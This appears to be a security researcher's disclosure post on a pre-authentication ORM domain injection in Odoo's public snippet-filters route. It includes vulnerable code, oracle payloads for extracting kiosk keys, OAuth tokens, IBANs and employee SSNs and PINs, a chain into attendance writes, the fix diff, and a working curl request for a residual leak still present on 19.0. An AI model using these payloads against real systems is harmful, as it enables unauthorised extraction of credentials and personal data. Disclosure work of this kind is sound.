---
layout: post
title: "Odoo snippet filters: a pre-auth ORM domain you control, evaluated as superuser"
subtitle: "the public /website/snippet/filters route merged an attacker-supplied search_domain into a SUPERUSER ORM search, turning a product widget into an unauthenticated boolean oracle over OAuth tokens, bank IBANs, employee SSNs and kiosk keys"
date: 2026-03-23
tags: [orm-injection, odoo, pre-auth, oracle, bug-bounty]
category: research
tldr: "POST /website/snippet/filters is auth='public'. Its action_server_id branch runs .sudo().run(), and the website_sale product handler merges your search_domain into the ORM search with Domain.AND, restricting operators but never field paths. Odoo domains traverse relations with dotted paths, so as SUPERUSER you ask `('create_uid.company_id.attendance_kiosk_key','=like','a48f%')` and read whether the widget renders results: a true/false oracle over any stored field, no login. It chains: the kiosk key opens a second oracle on hr.employee (SSN, passport, PINs) and then pre-auth attendance writes. Odoo fixed the main path with sudo(False) and committed to a CVE; a narrower single-record residual still leaks names and ids on current 19.0. Found with Ilyase Dehy."
---

## a domain is a query language, and this route took one from the internet

`/website/snippet/filters` renders a marketing block: recently sold products, accessories, alternatives. It is `auth='public'` because those blocks appear on pages anonymous visitors load. Its request body carries the snippet's parameters, and one of them is `search_domain`.

An Odoo domain is the ORM's query DSL: leaves like `[('list_price', '>', 100)]`, joined with `&` / `|`, and able to walk relations through dotted paths (`create_uid.partner_id.email`). The ORM compiles those into SQL JOINs. A public endpoint that accepts a domain and acts on it is, structurally, a public endpoint that accepts queries. Whether that is a data leak comes down to one thing: whose permissions the query runs under.

This route ran it under two different identities depending on which branch you hit, and one of them was root.

## two branches, one of them runs as SUPERUSER

The controller, `addons/website/controllers/main.py:426-435`:

```python
@http.route('/website/snippet/filters', type='jsonrpc', auth='public', website=True, readonly=True)
def get_dynamic_filter(self, filter_id, **kwargs):
    dynamic_filter_sudo = request.env['website.snippet.filter'].sudo()
    if filter_id:
        dynamic_filter_sudo = dynamic_filter_sudo.search(
            Domain('id', '=', filter_id) & request.website.website_domain()
        )
    single_record_filter = kwargs.get('limit') == 1 and kwargs.get('res_model') and kwargs.get('res_id')
    dynamic_filter_found = single_record_filter or dynamic_filter_sudo
    return dynamic_filter_sudo._render(**kwargs) if dynamic_filter_found else []
```

`search_domain` arrives in `**kwargs` and is never validated. `_render` hands it to `_prepare_values`, which splits into two paths in `addons/website/models/website_snippet_filter.py`:

```python
# filter_id path — NOT vulnerable, runs as the public user
records = self.env[model_name].sudo(False).with_context(...).search(domain, ...)

# action_server_id path — VULNERABLE, runs as SUPERUSER
return self.action_server_id.with_context(
    dynamic_filter=self,
    limit=limit,
    search_domain=search_domain,     # untrusted input, carried in context
).sudo().run() or []                 # <-- SUPERUSER_ID
```

The `action_server_id` snippet filters are not something an admin has to configure. They are auto-created as data records the moment `website_sale` is installed (`addons/website_sale/data/data.xml`): "Recently Sold Products", "Recently Viewed", "Accessories", "Alternatives". Install the module, publish one product, and the SUPERUSER branch is live and reachable unauthenticated.

## where the domain gets merged, and what the merge does not protect

`addons/website_sale/models/website_snippet_filter.py:182-190`:

```python
@api.model
def _get_products(self, mode, **kwargs):
    ...
    search_domain = self.env.context.get('search_domain')   # untrusted
    domain = Domain.AND([
        [('website_published', '=', True)] if self.env.user._is_public() or self.env.user._is_portal() else [],
        website.website_domain(),
        [('company_id', 'in', [False, website.company_id.id])],
        search_domain or [],                                 # <-- injected here
    ])
```

Odoo 19 replaced `expression.AND()` with the new `Domain` class, and `Domain.AND` does one useful thing: it AND-combines, so you cannot inject a `|` to OR away the forced `website_published = True` filter. That is the protection Odoo's own "Building the domains" guidance recommends.

It is also the entire protection. `Domain.AND` says nothing about which **field paths** a leaf may reference. You cannot cancel the existing filters, but you can append a condition on any field reachable by relational traversal from `product.product`, and because the search runs as SUPERUSER, field-level access control never fires:

```python
# attacker sends:
search_domain = [("create_uid.company_id.attendance_kiosk_key", "=like", "a48f%")]

# becomes, after Domain.AND:
[('website_published','=',True), ('company_id','in',[False,1]),
 ("create_uid.company_id.attendance_kiosk_key","=like","a48f%")]

# ORM compiles to JOINs:
#   product_product -> product_template -> res_users -> res_company
#   WHERE res_company.attendance_kiosk_key LIKE 'a48f%'
```

The widget renders a product (true) or renders nothing (false). Lengthen the prefix one character at a time and each character falls out. That is the oracle.

The reason group-restricted and private fields are reachable at all: Odoo enforces `groups=`, `USER_PRIVATE_FIELDS`, and `check_field_access_rights` during **read** (`_read_from_database`), not during **domain evaluation** in `.search()`. A field you can never read can still be filtered on, and filtering is enough to infer it bit by bit.

## the negative control, because an oracle you cannot falsify is noise

Every extracted path was confirmed against a control pattern that must not match. Probe a real prefix and a guaranteed-miss prefix on the same field:

```
('create_uid.company_id.attendance_kiosk_key','=like','a48f%')  -> renders  (true)
('create_uid.company_id.attendance_kiosk_key','=like','ZZZNOMATCH_XYZ99%') -> empty (false)
```

If the nonsense prefix had also matched, the "signal" would be a computed/non-stored field giving a constant answer, not a real read. It does not match. The bit is real and you can turn it off on demand.

## what comes out, ranked by how much it should never be readable unauthenticated

From `product.product`, with `website_sale` alone: company name/email/phone/VAT/registry, company bank IBAN (`bank_ids.sanitized_acc_number`), every user `login`, user emails/phones/street/city, supplier names and contacts, message author emails via `mail.thread`. Add modules and it gets worse:

- **`auth_oauth`** -> `create_uid.user_ids.oauth_access_token`, the live Google/Microsoft SSO bearer token, a `USER_PRIVATE_FIELDS` entry.
- **`hr_attendance`** -> `create_uid.company_id.attendance_kiosk_key`, a `groups='hr_attendance...'` field. That key is the pivot.

26 traversal paths verified on `product.product`. The point is not the count, it is that one unauthenticated GET-shaped JSON-RPC reaches three modules' secrets through a marketing widget.

## the chain: kiosk key -> employee oracle -> attendance writes

`hr_attendance` exposes its own public route with the same shape, `addons/hr_attendance/controllers/main.py:202`:

```python
@http.route('/hr_attendance/employees_infos', type="jsonrpc", auth="public")
def employees_infos(self, token, limit, offset, domain):
    company = self._get_company(token)               # token = the kiosk key we just oracled
    if company:
        domain = Domain(domain) & Domain('company_id', '=', company.id)
        employees = request.env['hr.employee'].sudo().search_fetch(domain, ...)
```

With the kiosk key, `domain=[]` enumerates every employee, and `[('id','=',N),('pin','=like','1%')]` walks each PIN digit by digit (recovered four exact PINs on the lab). The same oracle reaches `ssnid`, `passport_id`, `visa_no`, `permit_no`, `private_street`, `emergency_contact`, `bank_account_id.sanitized_acc_number`, `birthday`, and traverses `parent_id` / `coach_id` / `child_ids` to pull the manager's SSN and subordinates' private emails. 22+ verified paths on `hr.employee`, all `groups="hr.group_hr_user"` fields the public user can never read, all reachable because the search is `.sudo()`.

Then it stops being read-only. `POST /hr_attendance/set_settings` (`auth='public'`) writes `res.company.attendance_kiosk_mode` with nothing but the kiosk key, and `POST /hr_attendance/manual_selection` clocks any employee in or out when PIN mode is off (the default). That is the I:Low in the score: a pre-auth write to a company record the public role only has Read on.

## severity

`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` = **8.2 High**. Unauthenticated, network, no interaction, confidentiality high (OAuth tokens, IBANs, SSNs), integrity low (the attendance writes). Without `hr_attendance` it is still `C:H/I:N/A:N` = 7.5: OAuth tokens, company IBANs, and every user login. It is the same class as [CVE-2024-36259](https://nvd.nist.gov/vuln/detail/CVE-2024-36259) (Odoo 17 oracle via elevated RPC search), except pre-auth and over a public website route.

This is not user enumeration. It does not check whether a username exists; it reconstructs full values of access-controlled fields (SSNs, tokens, IBANs) character by character, and chains into integrity loss. Those are different findings.

## the fix, from the commit

Commit `c0c93e0110f9`, `[FIX] website_sale: dynamic filters as a visitor` (opw-6041547), drops superuser before the product domain is evaluated:

```diff
 def _get_products(self, mode, **kwargs):
     dynamic_filter = self.env.context.get("dynamic_filter")
-    handler = getattr(self, "_get_products_%s" % mode, self._get_products_latest_sold)
+    handler = getattr(self.sudo(False), "_get_products_%s" % mode, self.sudo(False)._get_products_latest_sold)
```
```diff
 def _get_products_latest_sold(self, website, limit, domain, **_kwargs):
     if sold_products:
-        products = sold_products.filtered_domain(domain)[:limit]
+        products = sold_products.sudo(False).filtered_domain(domain)[:limit]
```

`sudo(False)` evaluates the attacker's domain as the public website user. A leaf traversing into a field that user cannot read now raises an access error instead of silently resolving, and the oracle loses what it was reading. My original boolean-oracle PoC against the patched build fails with exactly that access error, which is the cleanest confirmation the fix is real. Odoo committed to publishing a CVE for it.

## the residual that is still live

The patch closes the multi-record oracle. The single-record branch of the same endpoint did not get the same treatment. With `limit=1` plus a `res_model` and `res_id`, an unauthenticated request still triggers an elevated render that reads fields off arbitrary records:

```bash
curl -s http://localhost:8019/website/snippet/filters \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"call","id":1,"params":{
        "filter_id":7,
        "template_key":"website_sale.dynamic_filter_template_product_public_category_default",
        "limit":1,"res_model":"res.users","res_id":1}}'
```

It is narrower than the oracle, it leaks names and identifiers from sensitive models like `res.users` and `res.company` rather than walking arbitrary fields, and I have not driven it past that. I am flagging it as a partial residual, not dressing it up as the full pre-auth oracle, which is closed. No CVE for the residual.

## the lesson

A domain is code. The only boundary on a public endpoint that evaluates one is the identity it runs under. `auth='public'` plus `.sudo().run()` is the pair to grep for: open to everyone, executed as root. `Domain.AND` stopped operator injection and everyone assumed the input was safe; it never constrained the field paths, which is where the whole oracle lives. The fix is one word, `sudo(False)`, applied to the branch that forgot it.

## references

- [website_snippet_filter (website_sale, 19.0)](https://github.com/odoo/odoo/blob/19.0/addons/website_sale/models/website_snippet_filter.py)
- [get_dynamic_filter controller (website, 19.0)](https://github.com/odoo/odoo/blob/19.0/addons/website/controllers/main.py)
- [Fix commit c0c93e0110f9](https://github.com/odoo/odoo/commit/c0c93e0110f9526e81fde4c1fdccb9ced0eefd97)
- [CVE-2024-36259: Odoo oracle via crafted RPC search with elevated privileges](https://nvd.nist.gov/vuln/detail/CVE-2024-36259)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [Odoo ORM search domains](https://www.odoo.com/documentation/19.0/developer/reference/backend/orm.html#search-domains)
